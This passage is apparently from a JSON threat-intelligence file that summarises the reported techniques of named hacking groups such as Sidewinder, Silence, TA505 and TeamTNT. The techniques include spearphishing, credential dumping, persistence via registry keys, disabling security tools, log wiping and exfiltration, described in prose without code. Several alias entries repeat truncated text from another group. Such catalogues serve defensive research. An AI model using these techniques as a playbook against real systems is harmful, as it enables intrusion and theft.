GitHub, and paste.ee., During C0027, Scattered Spider used Windows Management Instrumentation (WMI) to move laterally via Impacket., Scattered Spider has sent SMS phishing messages to employee phone numbers with a link to a site configured with a fake credential harvesting login portal.",
    "SideCopy": "SideCopy is a Pakistani threat group that has primarily targeted South Asian countries, including Indian and Afghani government personnel, since at least 2019. SideCopy's name comes from its infection chain that tries to mimic that of Sidewinder, a suspected Indian threat group., SideCopy has sent Microsoft Office Publisher documents to victims that have embedded malicious macros that execute an hta file via calling mshta.exe., SideCopy has compromised domains for some of their infrastructure, including for C2 and staging malware., SideCopy has used a malicious loader DLL file to execute the credwiz.exe process and side-load the malicious payload Duser.dll., SideCopy has delivered trojanized executables via spearphishing emails that contacts actor-controlled servers to download malicious payloads., SideCopy has used a legitimate DLL file name, Duser.dll to disguise a malicious remote access tool., SideCopy has executed malware by calling the API function CreateProcessW., SideCopy has sent spearphishing emails with malicious hta file attachments., SideCopy has crafted generic lures for spam campaigns to collect emails and credentials for targeting efforts., SideCopy has collected browser information from a compromised host., SideCopy uses a loader DLL file to collect AV product names from an infected host., SideCopy has used compromised domains to host its malicious payloads., SideCopy has utilized mshta.exe to execute a malicious hta file., SideCopy has identified the OS version of a compromised host., SideCopy has identified the country location of a compromised host., SideCopy has identified the IP address of a compromised host., SideCopy has attempted to lure victims into clicking on malicious embedded archive files sent via spearphishing campaigns.",
    "Sidewinder": "Sidewinder is a suspected Indian threat actor group that has been active since at least 2012. They have been observed targeting government, military, and business entities throughout Asia, primarily focusing on Pakistan, China, Nepal, and Afghanistan., , , Sidewinder has used HTTP in C2 communications., Sidewinder has used tools to automatically collect system and network configuration information., Sidewinder has configured tools to automatically send collected files to attacker controlled servers., Sidewinder has added paths to executables in the Registry to establish persistence., Sidewinder has used PowerShell to drop and execute malware loaders., Sidewinder has used VBScript to drop and execute malware loaders., Sidewinder has used JavaScript to drop and execute malware loaders., Sidewinder has collected stolen files in a temporary folder in preparation for exfiltration., Sidewinder has exploited vulnerabilities to gain execution including CVE-2017-11882 and CVE-2020-0674., Sidewinder has used malware to collect information on files and directories., Sidewinder has used DLL side-loading to drop and execute malicious payloads including the hijacking of the legitimate Windows application file rekeywiz.exe., Sidewinder has used LNK files to download remote files to the victim's network., Sidewinder has used the ActiveXObject utility to create OLE objects to obtain execution through Internet Explorer., Sidewinder has named malicious files rekeywiz.exe to match the name of a legitimate Windows executable., Sidewinder has used base64 encoding for scripts., Sidewinder has used base64 encoding and ECDH-P256 encryption for payloads., Sidewinder has sent e-mails with malicious attachments often crafted for specific targets., Sidewinder has sent e-mails with malicious links often crafted for specific targets., Sidewinder has sent e-mails with malicious attachments that lead victims to credential harvesting websites., Sidewinder has sent e-mails with malicious links to credential harvesting websites., Sidewinder has used tools to identify running processes on the victim's machine., Sidewinder has used tools to enumerate software installed on an infected host., Sidewinder has used the Windows service winmgmts:/./root/SecurityCenter2 to check installed antivirus products., Sidewinder has used mshta.exe to execute malicious payloads., Sidewinder has used tools to collect the computer name, OS version, installed hotfixes, as well as information regarding the memory and processor on a compromised host., Sidewinder has used malware to collect information on network interfaces, including the MAC address., Sidewinder has used tools to identify the user of a compromised host., Sidewinder has used tools to obtain the current system time., Sidewinder has lured targets to click on malicious links to gain execution in the target environment., Sidewinder has lured targets to click on malicious files to gain execution in the target environment.",
    "T-APT-04": "Sidewinder has used PowerShell to drop and execute malware loaders., Sidewinder has used VBScript to drop and execute malware loaders., Sidewinder has used JavaScript to drop and execute malware loaders., Sidewinder has collected stolen files in a temporary folder in preparation for exfiltration., Sidewinder has exploited vulnerabilities to gain execution including CVE-2017-11882 and CVE-2020-0674., Sidewinder has used malware to collect information on files and directories., Sidewinder has used DLL side-loading to drop and execute malicious payloads including the hijacking of the legitimate Windows application file rekeywiz.exe., Sidewinder has used LNK files to download remote files to the victim's network., Sidewinder has used the ActiveXObject utility to create OLE objects to obtain execution through Internet Explorer., Sidewinder has named malicious files rekeywiz.exe to match the name of a legitimate Windows executable., Sidewinder has used base64 encoding for scripts., Sidewinder has used base64 encoding and ECDH-P256 encryption for payloads., Sidewinder has sent e-mails with malicious attachments often crafted for specific targets.",
    "Rattlesnake": "Sidewinder has sent e-mails with malicious links often crafted for specific targets., Sidewinder has sent e-mails with malicious attachments that lead victims to credential harvesting websites., Sidewinder has sent e-mails with malicious links to credential harvesting websites., Sidewinder has used tools to identify running processes on the victim's machine., Sidewinder has used tools to enumerate software installed on an infected host., Sidewinder has used the Windows service winmgmts:/./root/SecurityCenter2 to check installed antivirus products., Sidewinder has used mshta.exe to execute malicious payloads., Sidewinder has used tools to collect the computer name, OS version, installed hotfixes, as well as information regarding the memory and processor on a compromised host., Sidewinder has used malware to collect information on network interfaces, including the MAC address., Sidewinder has used tools to identify the user of a compromised host., Sidewinder has used tools to obtain the current system time., Sidewinder has lured targets to click on malicious links to gain execution in the target environment., Sidewinder has lured targets to click on malicious files to gain execution in the target environment.",
    "Silence": "Silence is a financially motivated threat actor targeting financial institutions in different countries. The group was first seen in June 2016. Their main targets reside in Russia, Ukraine, Belarus, Azerbaijan, Poland and Kazakhstan. They compromised various banking systems, including the Russian Central Bank's Automated Workstation Client, ATMs, and card processing. , , Silence has used HKCU/Software/Microsoft/Windows/CurrentVersion/Run, HKLM/Software/Microsoft/Windows/CurrentVersion/Run, and the Startup folder to establish persistence. , Silence has used PowerShell to download and execute payloads., Silence has used Windows command-line to run commands., Silence has used VBS scripts., Silence has used JS scripts., Silence has deleted artifacts, including scheduled tasks, communicates files from the C2 and other logs. , Silence has downloaded additional modules and malware to victim’s machines. , Silence has named its backdoor 'WINWORD.exe'., Silence can create, delete, or modify a specified Registry key or value., Silence has leveraged the Windows API, including using CreateProcess() or ShellExecute(), to perform a variety of tasks., Silence has used port 444 when sending data about the system from the client to the server. , Silence has used environment variable string substitution for obfuscation., Silence has obtained and modified versions of publicly-available tools like Empire and PsExec. , Silence has used the Farse6.1 utility (based on Mimikatz) to extract credentials from lsass.exe., Silence has sent emails with malicious DOCX, CHM, LNK and ZIP attachments. , Silence has injected a DLL library containing a Trojan into the fwmain32.exe process., Silence has used ProxyBot, which allows the attacker to redirect traffic from the current node to the backconnect server via Sock4/Socks5. , Silence has used RDP for lateral movement. , Silence has used Nmap to scan the corporate network, build a network topology, and identify vulnerable hosts. , Silence has used scheduled tasks to stage its operation., Silence can capture victim screen activity., Silence has used RAdmin, a remote software tool used to remotely control workstations and ATMs., Silence has used a valid certificate to sign their primary loader Silence.Downloader (aka TrueBot)., Silence has weaponized CHM files in their phishing campaigns., Silence has used Winexe to install a service on the remote system., Silence attempts to get users to launch malicious attachments delivered via spearphishing emails., Silence has used compromised credentials to log on to other systems and escalate privileges., Silence has been observed making videos of victims to observe bank employees day to day activities.",
    "Whisper Spider": "Silence has used HKCU/Software/Microsoft/Windows/CurrentVersion/Run, HKLM/Software/Microsoft/Windows/CurrentVersion/Run, and the Startup folder to establish persistence. , Silence has used PowerShell to download and execute payloads., Silence has used Windows command-line to run commands., Silence has used VBS scripts., Silence has used JS scripts., Silence has deleted artifacts, including scheduled tasks, communicates files from the C2 and other logs. , Silence has downloaded additional modules and malware to victim’s machines. , Silence has named its backdoor 'WINWORD.exe'., Silence can create, delete, or modify a specified Registry key or value., Silence has leveraged the Windows API, including using CreateProcess() or ShellExecute(), to perform a variety of tasks., Silence has used port 444 when sending data about the system from the client to the server. , Silence has used environment variable string substitution for obfuscation., Silence has obtained and modified versions of publicly-available tools like Empire and PsExec. , Silence has used the Farse6.1 utility (based on Mimikatz) to extract credentials from lsass.exe., Silence has sent emails with malicious DOCX, CHM, LNK and ZIP attachments. , Silence has injected a DLL library containing a Trojan into the fwmain32.exe process., Silence has used ProxyBot, which allows the attacker to redirect traffic from the current node to the backconnect server via Sock4/Socks5. , Silence has used RDP for lateral movement. , Silence has used Nmap to scan the corporate network, build a network topology, and identify vulnerable hosts. , Silence has used scheduled tasks to stage its operation.",
    "Silent Librarian": "Silent Librarian is a group that has targeted research and proprietary data at universities, government agencies, and private sector companies worldwide since at least 2013. Members of  Silent Librarian are known to have been affiliated with the Iran-based Mabna Institute which has conducted cyber intrusions at the behest of the government of Iran, specifically the Islamic Revolutionary Guard Corps (IRGC)., , , Silent Librarian has acquired domains to establish credential harvesting pages, often spoofing the target organization and using free top level domains .TK, .ML, .GA, .CF, and .GQ., Silent Librarian has used collected lists of names and e-mail accounts to use in password spraying attacks against private sector targets., Silent Librarian has exfiltrated entire mailboxes from compromised accounts., Silent Librarian has set up auto forwarding rules on compromised e-mail accounts., Silent Librarian has established e-mail accounts to receive e-mails forwarded from compromised accounts., Silent Librarian has collected e-mail addresses from targeted organizations from open Internet searches., Silent Librarian has collected lists of names for individuals from targeted organizations., Silent Librarian has obtained free and publicly available tools including SingleFile and HTTrack to copy login pages of targeted organizations., Silent Librarian has obtained free Let's Encrypt SSL certificates for use on their phishing pages., Silent Librarian has used links in e-mails to direct victims to credential harvesting websites designed to appear like the targeted organization's login page., Silent Librarian has searched victim's websites to identify the interests and academic areas of targeted individuals and to scrape source code, branding, and organizational contact information for phishing pages., Silent Librarian has cloned victim organization login pages and staged them for later use in credential harvesting campaigns. Silent Librarian has also made use of a variety of URL shorteners for these staged websites., Silent Librarian has used compromised credentials to obtain unauthorized access to online accounts.",
    "TA407": "Silent Librarian has acquired domains to establish credential harvesting pages, often spoofing the target organization and using free top level domains .TK, .ML, .GA, .CF, and .GQ., Silent Librarian has used collected lists of names and e-mail accounts to use in password spraying attacks against private sector targets., Silent Librarian has exfiltrated entire mailboxes from compromised accounts., Silent Librarian has set up auto forwarding rules on compromised e-mail accounts., Silent Librarian has established e-mail accounts to receive e-mails forwarded from compromised accounts., Silent Librarian has collected e-mail addresses from targeted organizations from open Internet searches., Silent Librarian has collected lists of names for individuals from targeted organizations., Silent Librarian has obtained free and publicly available tools including SingleFile and HTTrack to copy login pages of targeted organizations., Silent Librarian has obtained free Let's Encrypt SSL certificates for use on their phishing pages., Silent Librarian has used links in e-mails to direct victims to credential harvesting websites designed to appear like the targeted organization's login page.",
    "COBALT DICKENS": "Silent Librarian has obtained free and publicly available tools including SingleFile and HTTrack to copy login pages of targeted organizations., Silent Librarian has obtained free Let's Encrypt SSL certificates for use on their phishing pages., Silent Librarian has used links in e-mails to direct victims to credential harvesting websites designed to appear like the targeted organization's login page., Silent Librarian has searched victim's websites to identify the interests and academic areas of targeted individuals and to scrape source code, branding, and organizational contact information for phishing pages., Silent Librarian has cloned victim organization login pages and staged them for later use in credential harvesting campaigns. Silent Librarian has also made use of a variety of URL shorteners for these staged websites., Silent Librarian has used compromised credentials to obtain unauthorized access to online accounts.",
    "SilverTerrier": "SilverTerrier is a Nigerian threat group that has been seen active since 2014. SilverTerrier mainly targets organizations in high technology, higher education, and manufacturing., SilverTerrier uses HTTP for C2 communications. , SilverTerrier uses FTP for C2 communications. , SilverTerrier uses SMTP for C2 communications., SilverTerrier targets organizations in high technology, higher education, and manufacturing for business email compromise (BEC) campaigns with the goal of financial theft.",
    "Sowbug": "Sowbug is a threat group that has conducted targeted attacks against organizations in South America and Southeast Asia, particularly government entities, since at least 2015. , Sowbug extracted documents and bundled them into a RAR archive., Sowbug has used command line during its intrusions., Sowbug extracted Word documents from a file server on a victim network., Sowbug identified and extracted all Word documents on a server by using a command containing * .doc and *.docx. The actors also searched for documents based on a specific date range and attempted to identify all installed software on a victim., Sowbug has used keylogging tools., Sowbug named its tools to masquerade as Windows or Adobe Reader software, such as by using the file name adobecms.exe and the directory CSIDL_APPDATA/microsoft/security., Sowbug listed remote shared drives that were accessible from a victim., Sowbug has used credential dumping tools., Sowbug obtained OS version and hardware configuration from a victim.",
    "Star Blizzard": "Star Blizzard is a cyber espionage and influence group originating in Russia that has been active since at least 2019. Star Blizzard campaigns align closely with Russian state interests and have included persistent phishing and credential theft against academic, defense, government, NGO, and think tank organizations in NATO countries, particularly the US and the UK., , , , , Star Blizzard has used HubSpot and MailerLite marketing platform services to hide the true sender of phishing emails. , Star Blizzard has registered domains using randomized words and with names resembling legitimate organizations. , Star Blizzard has used JavaScript to redirect victim traffic from an adversary controlled server to a server hosting the Evilginx phishing framework. , Star Blizzard has used compromised email accounts to conduct spearphishing against contacts of the original victim., Star Blizzard has remotely accessed victims' email accounts to steal messages and attachments., Star Blizzard has abused email forwarding rules to monitor the activities of a victim, steal information, and maintain persistent access after compromised credentials are reset., Star Blizzard has established fraudulent profiles on professional networking sites to conduct reconnaissance., Star Blizzard has registered impersonation email accounts to spoof experts in a particular field or individuals and organizations affiliated with the intended target., Star Blizzard has identified ways to engage targets by researching potential victims' interests and social or professional contacts., Star Blizzard has incorporated the open-source EvilGinx framework into their spearphishing activity. , Star Blizzard has sent emails with malicious .pdf files to spread malware., Star Blizzard has sent emails to establish rapport with targets eventually sending messages with attachments containing links to credential-stealing sites., Star Blizzard has sent emails to establish rapport with targets eventually sending messages with links to credential-stealing sites., Star Blizzard has used open-source research to identify information about victims to use in targeting., Star Blizzard has uploaded malicious payloads to cloud storage sites., Star Blizzard has used EvilGinx to steal the session cookies of victims directed to phishing domains., Star Blizzard has bypassed multi-factor authentication on victim email accounts by using session cookies stolen using EvilGinx., Star Blizzard has lured targets into opening malicious .pdf files to deliver malware., Star Blizzard has used stolen credentials to sign into victim email accounts.",
    "Stealth Falcon": "Stealth Falcon is a threat group that has conducted targeted spyware attacks against Emirati journalists, activists, and dissidents since at least 2012. Circumstantial evidence suggests there could be a link between this group and the United Arab Emirates (UAE) government, but that has not been confirmed. , Stealth Falcon malware communicates with its C2 server via HTTPS., Stealth Falcon malware uses WMI to script data collection and command execution on the victim., Stealth Falcon malware uses PowerShell commands to perform various functions, including gathering system information via WMI and executing commands from its C2 server., Stealth Falcon malware gathers passwords from multiple sources, including Windows Credential Vault and Outlook., Stealth Falcon malware gathers passwords from multiple sources, including Internet Explorer, Firefox, and Chrome., Stealth Falcon malware gathers passwords from the Windows Credential Vault., Stealth Falcon malware gathers data from the local victim system., Stealth Falcon malware encrypts C2 traffic using RC4 with a hard-coded key., After data is collected by Stealth Falcon malware, it is exfiltrated over the existing C2 channel., Stealth Falcon malware gathers a list of running processes., Stealth Falcon malware attempts to determine the installed version of .NET by querying the Registry., Stealth Falcon malware creates a scheduled task entitled 'IE Web Cache' to execute a malicious file hourly., Stealth Falcon malware gathers system information via WMI, including the system directory, build number, serial number, version, manufacturer, model, and total physical memory., Stealth Falcon malware gathers the Address Resolution Protocol (ARP) table from the victim., Stealth Falcon malware gathers the registered user and primary owner name via WMI., Stealth Falcon malware gathers system information via Windows Management Instrumentation (WMI).",
    "Strider": "Strider is a threat group that has been active since at least 2011 and has targeted victims in Russia, China, Sweden, Belgium, Iran, and Rwanda., ProjectSauron is used to refer both to the threat group also known as G0041 as well as the malware platform also known as S0125.  , Strider has used a hidden file system that is stored as a file on disk., Strider has registered its persistence module on domain controllers as a Windows LSA (Local System Authority) password filter to acquire credentials any time a domain, local user, or administrator logs in or changes a password., Strider has used local servers with both local network and Internet access to act as internal proxy nodes to exfiltrate data from other parts of the network without direct Internet access.",
    "Suckfly": "Suckfly is a China-based threat group that has been active since at least 2014. , Several tools used by Suckfly have been command-line driven., Suckfly the victim's internal network for hosts with ports 8080, 5900, and 40 open., Suckfly used a signed credential-dumping tool to obtain victim account credentials., Suckfly has used stolen certificates to sign its malware., Suckfly used legitimate account credentials that they dumped to navigate the internal victim network as though they were the legitimate account owner.",
    "TA2541": "TA2541 is a cybercriminal group that has been targeting the aviation, aerospace, transportation, manufacturing, and defense industries since at least 2017. TA2541 campaigns are typically high volume and involve the use of commodity remote access tools obfuscated by crypters and themes related to aviation, transportation, and travel., TA2541 has registered domains often containing the keywords 'kimjoy,' 'h0pe,' and 'grace,' using domain registrars including Netdorm and No-IP DDNS, and hosting providers including xTom GmbH and Danilenko, Artyom., TA2541 has hosted malicious files on various platforms including Google Drive, OneDrive, Discord, PasteText, ShareText, and GitHub., TA2541 has placed VBS files in the Startup folder and used Registry run keys to establish persistence for malicious payloads., TA2541 has used PowerShell to download files and to inject into various Windows processes., TA2541 has used VBS files to execute or establish persistence for additional payloads, often using file names consistent with email themes or mimicking system functionality., TA2541 has used dynamic DNS services for C2 infrastructure., TA2541 has used TLS encrypted C2 communications including for campaigns using AsyncRAT., TA2541  has attempted to disable built-in security protections such as Windows AMSI. , TA2541 has used malicious scripts and macros with the ability to download additional payloads., TA2541 has used file names to mimic legitimate Windows files or system functionality., TA2541 has used a .NET packer to obfuscate malicious files., TA2541 has used compressed and char-encoded scripts in operations., TA2541 has used multiple strains of malware available for purchase on criminal forums or in open-source repositories., TA2541 has used commodity remote access tools., TA2541 has sent phishing emails with malicious attachments for initial access including MS Word documents., TA2541 has used spearphishing e-mails with malicious links to deliver malware.  , TA2541 has injected malicious code into legitimate .NET related processes including  regsvcs.exe, msbuild.exe, and installutil.exe., TA2541 has used process hollowing to execute CyberGate malware., TA2541 has used scheduled tasks to establish persistence for installed tools. , TA2541 has used tools to search victim systems for security products such as antivirus and firewall software., TA2541 has uploaded malware to various platforms including Google Drive, Pastetext, Sharetext, and GitHub., TA2541 has used mshta to execute scripts including VBS., TA2541 has collected system information prior to downloading malware on the targeted host., TA2541 has run scripts to check internet connectivity from compromised hosts. , TA2541 has used malicious links to cloud and web services to gain execution on victim machines., TA2541 has used macro-enabled MS Word documents to lure victims into executing malicious payloads., TA2541 has used WMI to query targeted systems for security products.",
    "TA459": "TA459 is a threat group believed to operate out of China that has targeted countries including Russia, Belarus, Mongolia, and others. , TA459 has used PowerShell for execution of a payload., TA459 has a VBScript for execution., TA459 has exploited Microsoft Word vulnerability CVE-2017-0199 for execution., TA459 has targeted victims using spearphishing emails with malicious Microsoft Word attachments., TA459 has attempted to get victims to open malicious Microsoft Word attachment sent via spearphishing.",
    "TA505": "TA505 is a cyber criminal group that has been active since at least 2014. TA505 is known for frequently changing malware, driving global trends in criminal malware distribution, and ransomware campaigns involving Clop., , , , TA505 has used the tool EmailStealer to steal and send lists of e-mail addresses to a remote server., TA505 has registered domains to impersonate services such as Dropbox to distribute malware., TA505 has used HTTP to communicate with C2 nodes., TA505 has used PowerShell to download and execute malware and reconnaissance scripts., TA505 has executed commands using cmd.exe., TA505 has used VBS for code execution., TA505 has used JavaScript for code execution., TA505 has used malware to gather credentials from Internet Explorer., TA505 has used a wide variety of ransomware, such as Clop, Locky, Jaff, Bart, Philadelphia, and GlobeImposter, to encrypt victim files and demand a ransom payment., TA505 has decrypted packed DLLs with an XOR key., TA505 has used fast flux to mask botnets by distributing payloads across multiple IPs., TA505 has used malware to disable Windows Defender., TA505 has downloaded additional malware to execute on victim systems., TA505 has leveraged malicious Word documents that abused DDE., TA505 has used malware to disable Windows Defender through modification of the Registry., TA505 has deployed payloads that use Windows API calls on a compromised host., TA505 has used UPX to obscure malicious code., TA505 has used base64 encoded PowerShell commands., TA505 has password-protected malicious Word documents., TA505 has used malware such as Azorult and Cobalt Strike in their operations., TA505 has used a variety of tools in their operations, including AdFind, BloodHound, Mimikatz, and PowerSploit., TA505 has used TinyMet to enumerate members of privileged groups. TA505 has also run net group /domain., TA505 has used spearphishing emails with malicious attachments to initially compromise victims., TA505 has sent spearphishing emails containing malicious links., TA505 has been seen injecting a DLL into winword.exe., TA505 has staged malware on actor-controlled domains., TA505 has signed payloads with code signing certificates from Thawte and Sectigo., TA505 has used .iso files to deploy malicious .lnk files., TA505 has used msiexec to download and execute malicious Windows Installer files., TA505 has leveraged rundll32.exe to execute malicious DLLs., TA505 has used malware to gather credentials from FTP clients and Outlook., TA505 has used lures to get users to click links in emails and attachments. For example, TA505 makes their malware look like legitimate Microsoft Word documents, .pdf and/or .lnk files. , TA505 has used lures to get users to enable content in malicious attachments and execute malicious files contained in archives. For example, TA505 makes their malware look like legitimate Microsoft Word documents, .pdf and/or .lnk files. , TA505 has used stolen domain admin accounts to compromise additional hosts.",
    "Hive0065": "TA505 is known for frequently changing malware, driving global trends in criminal malware distribution, and ransomware campaigns involving Clop., , , , TA505 has used the tool EmailStealer to steal and send lists of e-mail addresses to a remote server., TA505 has registered domains to impersonate services such as Dropbox to distribute malware., TA505 has used HTTP to communicate with C2 nodes., TA505 has used PowerShell to download and execute malware and reconnaissance scripts., TA505 has executed commands using cmd.exe., TA505 has used VBS for code execution., TA505 has used JavaScript for code execution., TA505 has used malware to gather credentials from Internet Explorer., TA505 has used a wide variety of ransomware, such as Clop, Locky, Jaff, Bart, Philadelphia, and GlobeImposter, to encrypt victim files and demand a ransom payment., TA505 has decrypted packed DLLs with an XOR key., TA505 has used fast flux to mask botnets by distributing payloads across multiple IPs., TA505 has used malware to disable Windows Defender., TA505 has downloaded additional malware to execute on victim systems., TA505 has leveraged malicious Word documents that abused DDE., TA505 has used malware to disable Windows Defender through modification of the Registry., TA505 has deployed payloads that use Windows API calls on a compromised host., TA505 has used UPX to obscure malicious code.",
    "Spandex Tempest": "TA505 has used base64 encoded PowerShell commands., TA505 has password-protected malicious Word documents., TA505 has used malware such as Azorult and Cobalt Strike in their operations., TA505 has used a variety of tools in their operations, including AdFind, BloodHound, Mimikatz, and PowerSploit., TA505 has used TinyMet to enumerate members of privileged groups. TA505 has also run net group /domain., TA505 has used spearphishing emails with malicious attachments to initially compromise victims., TA505 has sent spearphishing emails containing malicious links., TA505 has been seen injecting a DLL into winword.exe., TA505 has staged malware on actor-controlled domains., TA505 has signed payloads with code signing certificates from Thawte and Sectigo., TA505 has used .iso files to deploy malicious .lnk files., TA505 has used msiexec to download and execute malicious Windows Installer files., TA505 has leveraged rundll32.exe to execute malicious DLLs., TA505 has used malware to gather credentials from FTP clients and Outlook., TA505 has used lures to get users to click links in emails and attachments. For example, TA505 makes their malware look like legitimate Microsoft Word documents, .pdf and/or .lnk files. , TA505 has used lures to get users to enable content in malicious attachments and execute malicious files contained in archives. For example, TA505 makes their malware look like legitimate Microsoft Word documents, .pdf and/or .lnk files. , TA505 has used stolen domain admin accounts to compromise additional hosts.",
    "TA551": "TA551 is a financially-motivated threat group that has been active since at least 2018.  The group has primarily targeted English, German, Italian, and Japanese speakers through email-based malware distribution campaigns. , , , TA551 has used HTTP for C2 communications., TA551 has used cmd.exe to execute commands., TA551 has used encoded ASCII text for initial C2 communications., TA551 has used a DGA to generate URLs from executed macros., TA551 has used spoofed company emails that were acquired from email clients on previously infected hosts to target other individuals., TA551 has retrieved DLLs and installer binaries for malware execution from C2., TA551 has masked malware DLLs as dat and jpg files., TA551 has hidden encoded data for malware DLLs in a PNG., TA551 has used obfuscated variable names in a JavaScript configuration file., TA551 has sent spearphishing attachments with password protected ZIP files., TA551 has used mshta.exe to execute malicious payloads., TA551 has used regsvr32.exe to load malicious DLLs., TA551 has used rundll32.exe to load malicious DLLs., TA551 has prompted users to enable macros within spearphishing attachments to install malware.",
    "TA577": "TA577 is an initial access broker (IAB) that has distributed QakBot and Pikabot, and was among the first observed groups distributing Latrodectus in 2023., TA577 has used BAT files in malware execution chains., TA577 has used JavaScript to execute additional malicious payloads., TA577 has sent thread hijacked messages from compromised emails., TA577 has used LNK files to execute embedded DLLs., TA577 has sent emails containing links to malicious JavaScript files., TA577 has lured users into executing malicious JavaScript files by sending malicious links via email.",
    "TA578": "TA578 is a threat actor that has used contact forms and email to initiate communications with victims and to distribute malware including Latrodectus, IcedID, and Bumblebee., TA578 has used Google Firebase to host malicious scripts., TA578 has used JavaScript files in malware execution chains., TA578 has filled out contact forms on victims' websites to direct them to adversary-controlled URLs., TA578 has placed malicious links in contact forms on victim sites, often spoofing a copyright complaint, to redirect users to malicious file downloads.",
    "TeamTNT": "TeamTNT is a threat group that has primarily targeted cloud and containerized environments. The group as been active since at least October 2019 and has mainly focused its efforts on leveraging cloud and container resources to deploy cryptocurrency miners in victim environments., TeamTNT has added RSA keys in authorized_keys., TeamTNT has obtained domains to host their payloads., TeamTNT has scanned specific lists of target IP addresses., TeamTNT has scanned for vulnerabilities in IoT devices and other related resources such as the Docker API., TeamTNT has used an IRC bot for C2 communications., TeamTNT has the curl command to send credentials over HTTP and the curl and wget commands to download new software. TeamTNT has also used a custom user agent HTTP header in shell scripts., TeamTNT has added batch scripts to the startup folder., TeamTNT has executed PowerShell commands in batch scripts., TeamTNT has used batch scripts to download tools and executing cryptocurrency miners., TeamTNT has used shell scripts for execution., TeamTNT has leveraged AWS CLI to enumerate cloud environments with compromised credentials., TeamTNT executed Hildegard through the kubelet API run command and by executing commands on running containers., TeamTNT has checked for running containers with docker ps and for specific container names with docker inspect. TeamTNT has also searched for Kubernetes pods running in a local network., TeamTNT has created local privileged users on victim machines., TeamTNT has established persistence through the creation of a cryptocurrency mining system service using systemctl., TeamTNT has used malware that adds cryptocurrency miners as a service., TeamTNT has aggregated collected credentials in text files before exfiltrating., TeamTNT has used a script that decodes a Base64-encoded version of WeaveWorks Scope., TeamTNT has deployed different types of containers into victim environments to facilitate execution. TeamTNT has also transferred cryptocurrency mining software to Kubernetes clusters discovered within local IP address ranges., TeamTNT has developed custom malware such as Hildegard., TeamTNT has deployed privileged containers that mount the filesystem of victim machine., TeamTNT has sent locally staged files with collected credentials to C2 servers using cURL., TeamTNT has used open-source tools such as Weave Scope to target exposed Docker API ports and gain initial access to victim environments. TeamTNT has also targeted exposed kubelets for Kubernetes environments., TeamTNT has used a script that checks /proc/*/environ for environment variables related to AWS., TeamTNT has modified the permissions on binaries with chattr., TeamTNT has disabled and uninstalled security tools such as Alibaba, Tencent, and BMC cloud monitoring agents on cloud-based infrastructure., TeamTNT has disabled iptables., TeamTNT has removed system logs from /var/log/syslog., TeamTNT has cleared command history with history -c., TeamTNT has used a payload that removes itself after running. TeamTNT also has deleted locally staged files for collecting credentials or scan results for local IP addresses after exfiltrating them., TeamTNT has the curl and wget commands as well as batch scripts to download new tools., TeamTNT has disguised their scripts with docker-related file names., TeamTNT has replaced .dockerd and .dockerenv with their own scripts and cryptocurrency mining software., TeamTNT has used masscan to search for open Docker API ports and Kubernetes clusters. TeamTNT has also used malware that utilizes zmap and zgrab to search for vulnerable services in cloud environments., TeamTNT has used UPX and Ezuri packer to pack its binaries., TeamTNT has encrypted its binaries via AES and encoded files using Base64., TeamTNT has searched for attached VGA devices using lspci., TeamTNT has searched for rival malware and removes it if found. TeamTNT has also searched for running processes containing the strings aliyun or liyun to identify machines running Alibaba Cloud Security tools., TeamTNT has established tmate sessions for C2 communications., TeamTNT has used SSH to connect back to victim machines. TeamTNT has also used SSH to transfer tools and payloads onto victim hosts and execute them., TeamTNT has deployed XMRig Docker images to mine cryptocurrency. TeamTNT has also infected Docker containers and Kubernetes clusters with XMRig, and used RainbowMiner and lolMiner for mining cryptocurrency., TeamTNT has used rootkits such as the open-source Diamorphine rootkit and their custom bots to hide cryptocurrency mining activities on the machine. , TeamTNT has searched for security products on infected machines., TeamTNT has uploaded backdoored Docker images to Docker Hub., TeamTNT has searched for system version, architecture, disk partition, logical volume, and hostname information., TeamTNT has enumerated the host machine’s IP address., TeamTNT has run netstat -anp to search for rival malware connections. TeamTNT has also used libprocesshider to modify /etc/ld.so.preload., TeamTNT has searched for services such as Alibaba Cloud Security's aliyun service and BMC Helix Cloud Security's bmc-agent service in order to disable them., TeamTNT has created system services to execute cryptocurrency mining software., TeamTNT has searched for unsecured AWS credentials and Docker API credentials., TeamTNT has searched for unsecured SSH keys., TeamTNT has queried the AWS instance metadata service for credentials., TeamTNT has relied on users to download and execute malicious Docker images., TeamTNT has leveraged iplogger.org to send collected data back to C2.",
    "TEMP.Veles": "TEMP.Veles is a Russia-based threat group that has targeted critical infrastructure. The group has been observed utilizing TRITON, a malware framework designed to manipulate industrial safety systems., The activity group XENOTIME, as defined by Dragos, has overlaps with activity reported upon by FireEye about TEMP.Veles as well as the actors behind TRITON., , , During the C0032 campaign, TEMP.Veles used Virtual Private Server (VPS) infrastructure., In the Triton Safety Instrumented System Attack, TEMP.Veles engaged in network reconnaissance against targets of interest., In the Triton Safety Instrumented System Attack, TEMP.Veles used a publicly available PowerShell-based tool, WMImplant.During the C0032 campaign, TEMP.Veles used PowerShell to perform timestomping., During the C0032 campaign, TEMP.Veles used PowerShell to perform timestomping., During the C0032 campaign, TEMP.Veles used staging folders that are infrequently used by legitimate users or processes to store data for exfiltration and tool deployment., In the Triton Safety Instrumented System Attack, TEMP.Veles developed, prior to the attack, malware capabilities that would require access to specific and specialized hardware and software., In the Triton Safety Instrumented System Attack, TEMP.Veles used cryptcat binaries to encrypt their traffic., During the C0032 campaign, TEMP.Veles modified and added entries within HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options to maintain persistence., During the C0032 campaign, TEMP.Veles used VPN access to persist in the victim environment., During the C0032 campaign, TEMP.Veles routinely deleted tools, logs, and other files after they were finished with them., During the C0032 campaign, TEMP.Veles used timestomping to modify the $STANDARD_INFORMATION attribute on tools., In the Triton Safety Instrumented System Attack, TEMP.Veles captured credentials as they were being changed by redirecting text-based login codes to websites they controlled., In the Triton Safety Instrumented System Attack, TEMP.Veles renamed files to look like legitimate files, such as Windows update files or Schneider Electric application files.During the C0032 campaign, TEMP.Veles renamed files to look like legitimate files, such as Windows update files or Schneider Electric application files., During the C0032 campaign, TEMP.Veles renamed files to look like legitimate files, such as Windows update files or Schneider Electric application files., During the C0032 campaign, TEMP.Veles used port-protocol mismatches on ports such as 443, 4444, 8531, and 50501 during C2., In the Triton Safety Instrumented System Attack, TEMP.Veles modified files based on the open-source project cryptcat in an apparent attempt to decrease anti-virus detection rates., In the Triton Safety Instrumented System Attack, TEMP.Veles used tools such as Mimikatz and other open-source software.During the C0032 campaign, TEMP.Veles obtained and used tools such as Mimikatz and PsExec., During the C0032 campaign, TEMP.Veles obtained and used tools such as 